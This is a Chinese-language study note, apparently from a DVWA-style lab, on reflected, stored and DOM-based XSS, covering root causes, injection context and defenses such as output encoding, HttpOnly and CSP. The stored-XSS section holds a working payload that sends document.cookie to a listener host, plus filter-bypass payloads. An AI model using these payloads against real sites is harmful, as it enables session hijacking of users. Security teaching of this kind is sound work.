# XSS · 反射型 / 存储型 / DOM 型

## 本质

网站把用户输入原样输出到页面，浏览器把它当 **HTML/JS 代码执行**。

和 SQL 注入是同一个根因——**数据被当成了代码**，只是执行位置不同：

| 漏洞 | 代码在哪执行 | 谁受害 |
|---|---|---|
| SQL 注入 | 数据库 | 网站的数据 |
| XSS | 受害者浏览器 | 网站的用户 |

## 三种类型的区别

| 类型 | payload 在哪 | 谁能触发 | 危害 |
|---|---|---|---|
| 反射型 | URL 参数，后端原样回显 | 受害者点链接 | 一次性，需诱导点击 |
| 存储型 | 存进数据库 | **所有访问该页面的人** | 最大，可蠕虫传播 |
| DOM 型 | 前端 JS 直接读取 URL | 看链接怎么构造 | 不经过后端，防御点在前端 |

> 反射是"你点才中"，存储是"放着就中"，DOM 是"前端自己把自己坑了"。

---

## 反射型（XSS Reflected）

输入框输入：

```html
<script>alert(1)</script>
```

弹窗。看地址栏，payload 在 URL 里——**这就是"反射"**。

## 存储型（XSS Stored）

留言框输入同样的 payload，提交后弹窗。**关键区别：刷新页面，弹窗还在**——因为 payload 已写进数据库。

### 延伸：窃取会话 Cookie

起一个接收端：

```bash
python3 -m http.server 8000
```

在留言框提交：

```html
<script>new Image().src='http://192.168.59.128:8000/?c='+document.cookie</script>
```

接收端终端会看到：

```
GET /?c=PHPSESSID=8f3a2b1c...;%20security=low
```

**这串 PHPSESSID 就是登录凭证。** 拿着它构造请求，不用密码就能冒充受害者——这就是**会话劫持**。

这也解释了为什么防御要加 `HttpOnly`：让 JS 读不到 `document.cookie`。

## DOM 型（XSS DOM）

漏洞点在页面 JS 里：

```javascript
var lang = document.location.href.substring(...);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

### 第一次尝试失败

```
?default=<script>alert(1)</script>
```

**不弹窗。**

原因：payload 落在 `<option>` 标签内部，而 HTML 规范不允许 `<option>` 里有 `<script>`，浏览器直接丢弃。

F12 看到的结果：

```html
<option value="%3Cscript%3E...">English</option>   ← 编码进属性，死的
```

### 正确写法：先跳出容器

```
?default=</option></select><script>alert(1)</script>
```

F12 看到：

```html
</option></select><script>alert(1)</script>   ← 已经在 select 外面了
```

**这就执行了。**

### 核心认知：注入上下文

同一个 payload，位置不同，结果完全不同：

| 注入位置 | 能执行吗 |
|---|---|
| `<div>这里</div>` | ✅ 能 |
| `<option>这里</option>` | ❌ 不能（非法子元素） |
| `value="这里"` | ❌ 不能（是属性值） |
| `<script>var a = "这里"</script>` | ❌ 不能（是字符串） |

**所以真实测试第一步不是写 payload，是判断"我的输入落在哪"。**

## 不用 `<script>` 的写法（被过滤时用）

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

靠事件触发，不依赖 `<script>` 解析。

---

## 防御

| 措施 | 作用 |
|---|---|
| **输出编码** | 按上下文（HTML / JS / URL / 属性）分别编码，根本措施 |
| `HttpOnly` | 防 JS 读取 Cookie，减少会话劫持 |
| `Content-Security-Policy` | 限制脚本来源，即使注入也难执行 |
| 输入白名单 | 辅助 |

**排序很重要**：根本是输出编码，其他都是降低影响。

## 验证 DOM 型的方法

1. **Ctrl+U 看网页源代码** → 搜不到 payload（因为是 JS 运行时生成的）
2. **F12 看 Elements** → 能看到 payload

**"源码里没有、DOM 里有" = DOM 型。**
